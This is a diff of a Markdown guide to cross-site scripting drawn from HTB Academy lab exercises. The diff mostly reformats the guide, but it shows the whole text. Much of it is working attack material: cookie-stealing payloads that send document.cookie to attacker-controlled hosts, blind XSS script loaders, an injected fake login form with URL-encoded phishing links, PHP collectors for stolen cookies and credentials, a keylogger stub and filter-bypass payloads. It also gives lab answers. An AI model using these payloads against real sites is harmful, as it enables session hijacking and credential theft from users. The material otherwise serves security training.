@@ -1,34 +1,39 @@
-# Cross-Site Scripting (XSS) - HTB Academy Guide
+# 🔥 Cross-Site Scripting (XSS)
 
 > Complete XSS exploitation guide covering all attack types, payloads, and HTB Academy lab solutions
 
 ## 📚 Table of Contents
 
 ### Core Concepts
-- **[Overview](#overview)** - XSS fundamentals and impact
-- **[Types of XSS](#types-of-xss-vulnerabilities)** - Stored, Reflected, DOM-based
-- **[Basic Payloads](#basic-xss-testing-payloads)** - Standard testing payloads
-- **[Alternative Payloads](#alternative-payloads)** - Bypass techniques when `<script>` is blocked
+
+* [**Overview**](xss-cross-site-scripting.md#overview) - XSS fundamentals and impact
+* [**Types of XSS**](xss-cross-site-scripting.md#types-of-xss-vulnerabilities) - Stored, Reflected, DOM-based
+* [**Basic Payloads**](xss-cross-site-scripting.md#basic-xss-testing-payloads) - Standard testing payloads
+* [**Alternative Payloads**](xss-cross-site-scripting.md#alternative-payloads) - Bypass techniques when `<script>` is blocked
 
 ### Attack Techniques
-- **[XSS Discovery](#xss-discovery-methods)** - Automated and manual detection
-- **[Session Hijacking](#session-hijacking--cookie-stealing)** - Cookie theft and account takeover
-- **[Credential Harvesting](#credential-harvesting--phishing-attack)** - Phishing attacks via XSS
-- **[Blind XSS](#blind-xss-detection)** - Admin panel and hidden XSS exploitation
+
+* [**XSS Discovery**](xss-cross-site-scripting.md#xss-discovery-methods) - Automated and manual detection
+* [**Session Hijacking**](xss-cross-site-scripting.md#session-hijacking--cookie-stealing) - Cookie theft and account takeover
+* [**Credential Harvesting**](xss-cross-site-scripting.md#credential-harvesting--phishing-attack) - Phishing attacks via XSS
+* [**Blind XSS**](xss-cross-site-scripting.md#blind-xss-detection) - Admin panel and hidden XSS exploitation
 
 ### Practical Labs
-- **[HTB Academy Labs](#htb-academy-lab-solutions)** - Complete lab solutions and walkthroughs
-- **[Troubleshooting](#xss-troubleshooting--common-mistakes)** - Common issues and fixes
-- **[Tools & Resources](#tools-and-resources)** - Professional XSS testing toolkit
+
+* [**HTB Academy Labs**](xss-cross-site-scripting.md#htb-academy-lab-solutions) - Complete lab solutions and walkthroughs
+* [**Troubleshooting**](xss-cross-site-scripting.md#xss-troubleshooting--common-mistakes) - Common issues and fixes
+* [**Tools & Resources**](xss-cross-site-scripting.md#tools-and-resources) - Professional XSS testing toolkit
 
 ### Defense
-- **[Prevention](#detection-and-mitigation)** - Secure coding and mitigation techniques
 
----
+* [**Prevention**](xss-cross-site-scripting.md#detection-and-mitigation) - Secure coding and mitigation techniques
+
+***
 
 ## Quick Reference
 
 ### 🎯 **Essential XSS Payloads**
+
 ```html
 <!-- Basic Test -->
 <script>alert(1)</script>
@@ -46,6 +51,7 @@
 ```
 
 ### 🔍 **XSS Detection Flow**
+
 1. **Find input points** → Forms, URL params, headers
 2. **Test basic payload** → `<script>alert(1)</script>`
 3. **Check page source** → Look for payload reflection
@@ -53,28 +59,30 @@
 5. **Exploit discovered XSS** → Session hijacking, phishing
 
 ### 🎯 **HTB Academy Coverage**
-- ✅ **All XSS Types** - Stored, Reflected, DOM-based XSS
-- ✅ **Session Hijacking** - Cookie stealing and account takeover
-- ✅ **Phishing Attacks** - Credential harvesting via fake forms
-- ✅ **Blind XSS** - Admin panel exploitation techniques
-- ✅ **Bypass Techniques** - Filter evasion and encoding methods
-- ✅ **Complete Labs** - Step-by-step HTB Academy solutions
 
----
+* ✅ **All XSS Types** - Stored, Reflected, DOM-based XSS
+* ✅ **Session Hijacking** - Cookie stealing and account takeover
+* ✅ **Phishing Attacks** - Credential harvesting via fake forms
+* ✅ **Blind XSS** - Admin panel exploitation techniques
+* ✅ **Bypass Techniques** - Filter evasion and encoding methods
+* ✅ **Complete Labs** - Step-by-step HTB Academy solutions
+
+***
 
 ## Overview
 
 Cross-Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when user input is not properly sanitized and gets executed as JavaScript code in the victim's browser.
 
 **Impact:**
-- **Session hijacking** - Stealing authentication cookies
-- **Credential theft** - Capturing login credentials via fake forms
-- **Data exfiltration** - Accessing sensitive information
-- **Website defacement** - Modifying page content
-- **Phishing attacks** - Redirecting users to malicious sites
-- **Malware distribution** - Downloading malicious files
 
----
+* **Session hijacking** - Stealing authentication cookies
+* **Credential theft** - Capturing login credentials via fake forms
+* **Data exfiltration** - Accessing sensitive information
+* **Website defacement** - Modifying page content
+* **Phishing attacks** - Redirecting users to malicious sites
+* **Malware distribution** - Downloading malicious files
+
+***
 
 ## Types of XSS Vulnerabilities
 
@@ -83,12 +91,14 @@ Cross-Site Scripting (XSS) is a web application vulnerability that allows attack
 **Most Critical Type** - The injected payload gets stored in the back-end database and affects all users who visit the page.
 
 #### Characteristics:
-- **Persistent** - Payload remains after page refresh
-- **Wide impact** - Affects all users visiting the page
-- **Database storage** - Payload stored in backend database
-- **Hard to remove** - Requires database cleanup
+
+* **Persistent** - Payload remains after page refresh
+* **Wide impact** - Affects all users visiting the page
+* **Database storage** - Payload stored in backend database
+* **Hard to remove** - Requires database cleanup
 
 #### Example Scenario:
+
 ```html
 <!-- User input stored in database -->
 Username: <script>alert(document.cookie)</script>
@@ -98,23 +108,26 @@ Username: <script>alert(document.cookie)</script>
 ```
 
 #### Testing Method:
+
 1. Submit XSS payload through input form
 2. Refresh page to confirm persistence
 3. Check if other users see the same payload
 
----
+***
 
 ### 2. Reflected XSS (Non-Persistent XSS)
 
 **Temporary XSS** - Input gets processed by back-end server and returned without proper sanitization.
 
 #### Characteristics:
-- **Non-persistent** - Only affects targeted user
-- **Server processing** - Input reaches back-end server
-- **URL parameters** - Often exploited through GET requests
-- **Temporary messages** - Common in error messages
+
+* **Non-persistent** - Only affects targeted user
+* **Server processing** - Input reaches back-end server
+* **URL parameters** - Often exploited through GET requests
+* **Temporary messages** - Common in error messages
 
 #### Example Scenario:
+
 ```html
 <!-- User input in URL -->
 http://target.com/search?q=<script>alert(window.origin)</script>
@@ -124,32 +137,36 @@ http://target.com/search?q=<script>alert(window.origin)</script>
 ```
 
 #### Attack Vector:
+
 ```bash
 # Crafted malicious URL sent to victim
 http://target.com/index.php?task=<script>alert(window.origin)</script>
 ```
 
----
+***
 
 ### 3. DOM-based XSS (Client-Side XSS)
 
 **Client-side processing** - Completely processed on the browser through JavaScript, never reaches back-end server.
 
 #### Characteristics:
-- **Client-side only** - Never reaches backend server
-- **JavaScript processing** - Uses Document Object Model (DOM)
-- **No HTTP requests** - Processing happens in browser
-- **URL fragments** - Often uses # parameters
+
+* **Client-side only** - Never reaches backend server
+* **JavaScript processing** - Uses Document Object Model (DOM)
+* **No HTTP requests** - Processing happens in browser
+* **URL fragments** - Often uses # parameters
 
 #### Source and Sink Concept:
 
 **Source** - JavaScript object that takes user input:
-- URL parameters
-- Input fields
-- Hash fragments
-- localStorage/sessionStorage
+
+* URL parameters
+* Input fields
+* Hash fragments
+* localStorage/sessionStorage
 
 **Sink** - Function that writes to DOM objects:
+
 ```javascript
 // Vulnerable functions
 document.write()
@@ -163,6 +180,7 @@ append()
 ```
 
 #### Example Vulnerable Code:
+
 ```javascript
 // Source - getting user input
 var pos = document.URL.indexOf("task=");
@@ -173,33 +191,38 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ```
 
 #### DOM XSS Payload:
+
 ```html
 <!-- innerHTML doesn't execute <script> tags -->
 <img src="" onerror=alert(window.origin)>
 ```
 
----
+***
 
 ## Basic XSS Testing Payloads
 
 ### Standard Payloads
 
 **Basic Alert Payload:**
+
 ```html
 <script>alert(window.origin)</script>
 ```
 
 **Cookie Stealing:**
+
 ```html
 <script>alert(document.cookie)</script>
 ```
 
 **Phishing Login Form Injection:**
+
 ```html
 <script>document.write('<h3>Please login to continue</h3><form action=http://attacker.com><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');</script>
 ```
 
 **Session Hijacking (Cookie Stealing):**
+
 ```html
 <!-- Direct navigation method -->
 <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
@@ -212,6 +235,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ```
 
 **Blind XSS Detection Payloads:**
+
 ```html
 <script src=http://attacker.com/fieldname></script>
 '><script src=http://attacker.com/fieldname></script>
@@ -219,7 +243,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 <script>$.getScript("http://attacker.com/fieldname")</script>
 ```
 
----
+***
 
 ## Alternative Payloads
 
@@ -228,30 +252,35 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ### When `<script>` is Blocked
 
 **Image onerror event:**
+
 ```html
 <img src="" onerror=alert(window.origin)>
 <img src=x onerror=alert(document.cookie)>
 ```
 
 **SVG payload:**
+
 ```html
 <svg onload=alert(window.origin)>
 <svg/onload=alert(1)>
 ```
 
 **Input onfocus:**
+
 ```html
 <input autofocus onfocus=alert(window.origin)>
 <input onfocus=alert(1) autofocus>
 ```
 
 **Iframe JavaScript:**
+
 ```html
 <iframe src=javascript:alert(1)>
 <iframe src="javascript:alert(window.origin)">
 ```
 
 **Other HTML5 elements:**
+
 ```html
 <!-- Body onload -->
 <body onload=alert(1)>
@@ -269,6 +298,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ### Advanced Payloads
 
 **Event Handlers:**
+
 ```html
 <body onload=alert(1)>
 <div onmouseover=alert(1)>
@@ -277,6 +307,7 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ```
 
 **Without Parentheses:**
+
 ```html
 <script>alert`1`</script>
 <script>eval('alert\u00281\u0029')</script>
@@ -285,41 +316,47 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 ### Encoding Bypass Techniques
 
 **URL Encoding:**
+
 ```html
 %3Cscript%3Ealert(1)%3C/script%3E
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 ```
 
 **HTML Entities:**
+
 ```html
 &lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
 ```
 
 **Unicode Encoding:**
+
 ```html
 <script>alert('\u0058\u0053\u0053')</script>
 <script>alert('\x58\x53\x53')</script>
 ```
 
 **Double Encoding:**
+
 ```html
 %253Cscript%253Ealert(1)%253C/script%253E
 ```
 
 **Mixed Case:**
+
 ```html
 <ScRiPt>alert(1)</ScRiPt>
 <IMG SRC=x ONERROR=alert(1)>
 ```
 
----
+***
 
 ## XSS Discovery Methods
 
 ### 1. Automated Discovery
 
 **Open-Source Tools:**
+
 ```bash
 # XSStrike
 git clone https://github.com/s0md3v/XSStrike.git
@@ -336,14 +373,16 @@ xsser -u "http://target.com/search?q=XSS"
 ```
 
 **Commercial Scanners:**
-- Burp Suite Professional
-- Nessus
-- OWASP ZAP
-- Acunetix
+
+* Burp Suite Professional
+* Nessus
+* OWASP ZAP
+* Acunetix
 
 ### 2. Manual Discovery
 
 **Testing Approach:**
+
 1. **Identify input points** - All user inputs, not just forms
 2. **Submit test payload** - Use basic `<script>alert(1)</script>`
 3. **Analyze response** - Check page source for payload
@@ -351,16 +390,18 @@ xsser -u "http://target.com/search?q=XSS"
 5. **Test variations** - Try different payload types
 
 **Input Points to Test:**
-- HTML form fields
-- URL parameters (GET)
-- HTTP headers (User-Agent, Cookie, Referer)
-- JSON/XML parameters
-- File upload fields
-- Search functionality
+
+* HTML form fields
+* URL parameters (GET)
+* HTTP headers (User-Agent, Cookie, Referer)
+* JSON/XML parameters
+* File upload fields
+* Search functionality
 
 ### 3. Code Review
 
 **Frontend Code Review:**
+
 ```javascript
 // Look for dangerous functions
 document.write()
@@ -374,6 +415,7 @@ $(element).append(userInput)
 ```
 
 **Backend Code Review:**
+
 ```php
 // PHP - Look for unescaped output
 echo $_GET['input'];
@@ -385,9 +427,9 @@ htmlentities()
 filter_var()
 ```
 
----
+***
 
----
+***
 
 ## Common XSS Attack Scenarios
 
@@ -395,22 +437,22 @@ filter_var()
 
 > **💀 Critical Attack:** Steal authentication cookies to hijack user sessions without knowing passwords
 
-**Overview:**
-Session hijacking allows attackers to steal user authentication cookies through XSS, gaining unauthorized access to victim accounts without knowing their credentials.
+**Overview:** Session hijacking allows attackers to steal user authentication cookies through XSS, gaining unauthorized access to victim accounts without knowing their credentials.
 
 #### Blind XSS Detection
 
-**What is Blind XSS?**
-Blind XSS occurs when the vulnerability is triggered on a page we don't have access to (e.g., Admin panels, contact forms, support tickets).
+**What is Blind XSS?** Blind XSS occurs when the vulnerability is triggered on a page we don't have access to (e.g., Admin panels, contact forms, support tickets).
 
 **Common Blind XSS Targets:**
-- Contact Forms
-- Reviews 
-- User Details
-- Support Tickets
-- HTTP User-Agent header
+
+* Contact Forms
+* Reviews
+* User Details
+* Support Tickets
+* HTTP User-Agent header
 
 **Remote Script Loading for Detection:**
+
 ```html
 <!-- Basic remote script loading -->
 <script src="http://YOUR_IP/script.js"></script>
@@ -422,6 +464,7 @@ Blind XSS occurs when the vulnerability is triggered on a page we don't have acc
 ```
 
 **Blind XSS Detection Payloads:**
+
 ```html
 <script src=http://YOUR_IP></script>
 '><script src=http://YOUR_IP></script>
@@ -434,6 +477,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://YOUR_IP
 #### Complete Session Hijacking Workflow
 
 **Step 1: Setup Server for Detection**
+
 ```bash
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
@@ -441,6 +485,7 @@ sudo php -S 0.0.0.0:80
 ```
 
 **Step 2: Test Blind XSS Payloads**
+
 ```html
 # Submit different payloads in each field:
 <script src=http://10.10.14.55/fullname></script>
@@ -448,14 +493,14 @@ sudo php -S 0.0.0.0:80
 <script src=http://10.10.14.55/website></script>
 ```
 
-**Step 3: Create Cookie Stealing Script**
-Create `script.js`:
+**Step 3: Create Cookie Stealing Script** Create `script.js`:
+
 ```javascript
 new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
 ```
 
-**Step 4: Create Cookie Harvesting Server**
-Create `index.php`:
+**Step 4: Create Cookie Harvesting Server** Create `index.php`:
+
 ```php
 <?php
 if (isset($_GET['c'])) {
@@ -471,12 +516,14 @@ if (isset($_GET['c'])) {
 ```
 
 **Step 5: Deploy Working Payload**
+
 ```html
 <!-- Use discovered vulnerable field with script.js -->
 <script src=http://YOUR_IP/script.js></script>
 ```
 
 **Step 6: Collect Stolen Cookies**
+
 ```bash
 # Monitor server requests
 tail -f /tmp/tmpserver/cookies.txt
@@ -486,6 +533,7 @@ tail -f /tmp/tmpserver/cookies.txt
 ```
 
 **Step 7: Use Stolen Cookies**
+
 1. Navigate to target login page
 2. Open Firefox Developer Tools (Shift+F9)
 3. Go to Storage tab
@@ -496,34 +544,39 @@ tail -f /tmp/tmpserver/cookies.txt
 #### Alternative Cookie Stealing Methods
 
 **Direct Navigation Method:**
+
 ```javascript
 document.location='http://YOUR_IP/steal.php?cookie='+document.cookie;
 ```
 
 **Image Loading Method (Stealthy):**
+
 ```javascript
 new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
 ```
 
 **Fetch API Method:**
+
 ```javascript
 fetch('http://YOUR_IP/steal.php?cookie='+document.cookie);
 ```
 
 **XMLHttpRequest Method:**
+
 ```javascript
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'http://YOUR_IP/steal.php?cookie='+document.cookie);
 xhr.send();
 ```
 
----
+***
 
 ### 2. Credential Harvesting & Phishing Attack
 
 > **🎣 Social Engineering:** Create fake login forms to steal usernames and passwords
 
 **Basic Fake Login Form:**
+
 ```html
 <script>
 document.write('<h3>Please login to continue</h3>');
@@ -538,11 +591,13 @@ document.write('</form>');
 ### Advanced Phishing Attack (HTB Academy Style)
 
 **Complete Phishing Payload with Form Removal:**
+
 ```html
 '><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
 ```
 
 **URL Encoded Phishing Payload:**
+
 ```url
 %27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FATTACKER_IP%3APORT%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
 ```
@@ -550,6 +605,7 @@ document.write('</form>');
 **Complete Attack Workflow:**
 
 1. **Setup Credential Harvesting Server:**
+
 ```bash
 # Create server directory
 mkdir /tmp/tmpserver
@@ -557,6 +613,7 @@ cd /tmp/tmpserver
 ```
 
 2. **Create index.php for credential capture:**
+
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
@@ -570,30 +627,35 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ```
 
 3. **Start PHP listener:**
+
 ```bash
 sudo php -S 0.0.0.0:80
 ```
 
 4. **Craft malicious URL (example):**
+
 ```url
 http://target.com/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.55%3A80%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
 ```
 
 5. **Check captured credentials:**
+
 ```bash
 cat /tmp/tmpserver/creds.txt
 ```
 
 **Attack Breakdown:**
-- `'>` - Escapes from image URL attribute
-- `document.write()` - Injects fake login form
-- `getElementById('urlform').remove()` - Removes original form to avoid suspicion
-- `<!--` - Comments out remaining HTML to prevent rendering issues
-- Form redirects victims back to original site after credential theft
+
+* `'>` - Escapes from image URL attribute
+* `document.write()` - Injects fake login form
+* `getElementById('urlform').remove()` - Removes original form to avoid suspicion
+* `<!--` - Comments out remaining HTML to prevent rendering issues
+* Form redirects victims back to original site after credential theft
 
 ### 3. Keylogger
 
 **JavaScript Keylogger:**
+
 ```html
 <script>
 document.addEventListener('keypress', function(event) {
@@ -605,19 +667,21 @@ document.addEventListener('keypress', function(event) {
 ### 4. Page Defacement
 
 **Modifying Page Content:**
+
 ```html
 <script>
 document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 </script>
 ```
 
----
+***
 
 ## XSS Prevention and Bypass Techniques
 
 ### Common Filters and Bypasses
 
 **Filter: Blocking `<script>` tags**
+
 ```html
 <!-- Bypass with other tags -->
 <img src=x onerror=alert(1)>
@@ -626,6 +690,7 @@ document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 ```
 
 **Filter: Blocking `alert()`**
+
 ```html
 <!-- Alternative functions -->
 <script>confirm(1)</script>
@@ -634,6 +699,7 @@ document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 ```
 
 **Filter: Blocking quotes**
+
 ```html
 <!-- Using backticks -->
 <script>alert`1`</script>
@@ -643,6 +709,7 @@ document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 ```
 
 **Filter: Case-sensitive filtering**
+
 ```html
 <!-- Mixed case -->
 <ScRiPt>alert(1)</ScRiPt>
@@ -650,6 +717,7 @@ document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 ```
 
 **Filter: Blocking form injection**
+
 ```html
 <!-- Using DOM manipulation instead of direct HTML -->
 <script>
@@ -663,6 +731,7 @@ document.body.appendChild(form);
 ### HTML Context Escaping
 
 **Escaping from different contexts:**
+
 ```html
 <!-- Breaking out of attribute -->
 " onmouseover="alert(1)
@@ -675,11 +744,12 @@ document.body.appendChild(form);
 ]]><script>alert(1)</script>
 ```
 
----
+***
 
 ## Tools and Resources
 
 ### Testing Tools
+
 ```bash
 # XSStrike - Advanced XSS detection
 python xsstrike.py -u "target.com" --crawl
@@ -695,6 +765,7 @@ python xsstrike.py -u "target.com" --crawl
 ```
 
 ### Session Hijacking Tools
+
 ```bash
 # XSS Hunter - Blind XSS detection platform
 https://xsshunter.com/
@@ -721,22 +792,25 @@ nc -lvnp 80
 ```
 
 ### Payload Repositories
-- **PayloadAllTheThings** - XSS section
-- **PayloadBox** - XSS payloads
-- **OWASP XSS Filter Evasion** - Bypass techniques
-- **PortSwigger XSS Cheat Sheet** - Browser-specific payloads
+
+* **PayloadAllTheThings** - XSS section
+* **PayloadBox** - XSS payloads
+* **OWASP XSS Filter Evasion** - Bypass techniques
+* **PortSwigger XSS Cheat Sheet** - Browser-specific payloads
 
 ### Vulnerable Practice Sites
-- **DVWA** - Damn Vulnerable Web Application
-- **bWAPP** - Buggy Web Application
-- **WebGoat** - OWASP WebGoat
-- **XSS Game** - Google XSS Challenge
 
----
+* **DVWA** - Damn Vulnerable Web Application
+* **bWAPP** - Buggy Web Application
+* **WebGoat** - OWASP WebGoat
+* **XSS Game** - Google XSS Challenge
+
+***
 
 ## Detection and Mitigation
 
 ### Security Headers
+
 ```bash
 # Content Security Policy
 Content-Security-Policy: default-src 'self'
@@ -749,6 +823,7 @@ X-Content-Type-Options: nosniff
 ```
 
 ### Secure Coding Practices
+
 ```javascript
 // Input validation
 function sanitizeInput(input) {
@@ -766,28 +841,32 @@ function escapeHtml(text) {
 }
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Question Examples
 
 **Cookie Stealing Payload:**
+
 ```html
 <script>alert(document.cookie)</script>
 ```
 
 **DOM XSS with innerHTML:**
+
 ```html
 <img src="" onerror=alert(document.cookie)>
 ```
 
 **Reflected XSS in URL parameter:**
+
 ```bash
 http://target.com/index.php?task=<script>alert(document.cookie)</script>
 ```
 
 **Phishing Attack (HTB Academy Labs):**
+
 ```html
 # Raw payload for phishing exercise
 '><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
@@ -797,6 +876,7 @@ http://SERVER_IP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3
 ```
 
 **Session Hijacking Lab (HTB Academy):**
+
 ```bash
 # Step 1: Test blind XSS detection payloads
 <script src=http://YOUR_IP/fullname></script>
@@ -818,6 +898,7 @@ cat cookies.txt
 ```
 
 **XSS Discovery Exercise Solutions:**
+
 ```bash
 # Finding vulnerable parameter
 # Answer: email (example from HTB labs)
@@ -826,13 +907,14 @@ cat cookies.txt
 # Answer: reflected (example from HTB labs)
 ```
 
----
+***
 
 ## XSS Troubleshooting & Common Mistakes
 
 ### Phishing Attack Issues
 
 **Problem: Payload not working**
+
 ```bash
 # Check 1: Basic XSS first
 <script>alert(1)</script>
@@ -846,6 +928,7 @@ ifconfig tun0
 ```
 
 **Problem: PWNIP:PWNPO placeholders**
+
 ```html
 # ❌ WRONG - Using placeholders from tutorial
 action=http://PWNIP:PWNPO
@@ -855,6 +938,7 @@ action=http://10.10.14.55:8080
 ```
 
 **Problem: Server not receiving credentials**
+
 ```bash
 # Check if PHP server is running
 sudo netstat -tlnp | grep :8080
@@ -867,6 +951,7 @@ sudo nc -lvnp 8080
 ```
 
 **Problem: Form not appearing**
+
 ```html
 # Debug: Check browser console (F12)
 # Look for JavaScript errors
@@ -878,6 +963,7 @@ View Source or Ctrl+U
 ### Session Hijacking Issues
 
 **Problem: No requests to server during blind XSS testing**
+
 ```bash
 # Check 1: Server is running
 sudo php -S 0.0.0.0:80
@@ -894,6 +980,7 @@ curl http://YOUR_IP
 ```
 
 **Problem: Script.js not loading**
+
 ```bash
 # Check file exists in server directory
 ls -la /tmp/tmpserver/script.js
@@ -906,6 +993,7 @@ curl http://YOUR_IP/script.js
 ```
 
 **Problem: Cookies not being captured**
+
 ```javascript
 // Debug: Check if document.cookie contains anything
 console.log(document.cookie);
@@ -916,6 +1004,7 @@ fetch('http://YOUR_IP/steal?c='+document.cookie);
 ```
 
 **Problem: Cookie injection not working**
+
 ```bash
 # Check cookie format in browser
 # Format should be: Name=Value
@@ -929,6 +1018,7 @@ fetch('http://YOUR_IP/steal?c='+document.cookie);
 ### Common Payload Encoding Issues
 
 **URL Encoding Problems:**
+
 ```bash
 # Spaces must be encoded as %20 or +
 Please login to continue
@@ -943,6 +1033,7 @@ Please+login+to+continue
 ```
 
 **JavaScript String Escaping:**
+
 ```javascript
 // ❌ WRONG - Unescaped quotes
 document.write('<form action="http://attacker.com">');
@@ -954,12 +1045,13 @@ document.write('<form action=http://attacker.com>');
 ### Debugging XSS Payloads
 
 **Step-by-step debugging:**
+
 1. Test basic XSS: `<script>alert(1)</script>`
 2. Test with URL parameter: `?url=<script>alert(1)</script>`
 3. Check payload encoding with online tools
 4. Verify server listening: `sudo php -S 0.0.0.0:8080`
 5. Test credential capture with manual form submission
 
----
+***
 
-*This XSS guide covers the fundamental concepts and practical techniques from HTB Academy's Cross-Site Scripting module, providing a comprehensive resource for penetration testing and web application security assessment.* 
+_This XSS guide covers the fundamental concepts and practical techniques from HTB Academy's Cross-Site Scripting module, providing a comprehensive resource for penetration testing and web application security assessment._
